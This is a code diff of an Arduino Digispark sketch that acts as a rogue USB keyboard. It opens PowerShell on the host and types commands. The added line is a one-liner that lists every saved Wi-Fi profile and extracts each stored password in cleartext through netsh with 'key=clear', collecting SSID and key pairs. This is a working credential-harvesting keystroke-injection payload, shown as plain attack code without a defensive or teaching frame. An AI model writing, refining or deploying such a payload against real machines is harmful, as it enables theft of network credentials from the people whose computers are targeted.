@@ -20,7 +20,7 @@ void loop() {
   DigiKeyboard.print("powershell"); // write powershell 
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
   delay(1000);
-  DigiKeyboard.print("$a = @() ; netsh wlan show profile");// Create empty array
+  DigiKeyboard.print("$arr=$(netsh wlan show profile)-split': ';$res=@();for($i=10;$i-le$arr.Length-2;$i+=2){$ssid=$arr[$i];$pss=$(netsh wlan show profile name=$ssid key=clear|findstr \"Key Content\")-split': ';$res+=$arr[$i]+\",\"+$pss[1]};$res");// Get SSIDs
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   delay(1000);
   
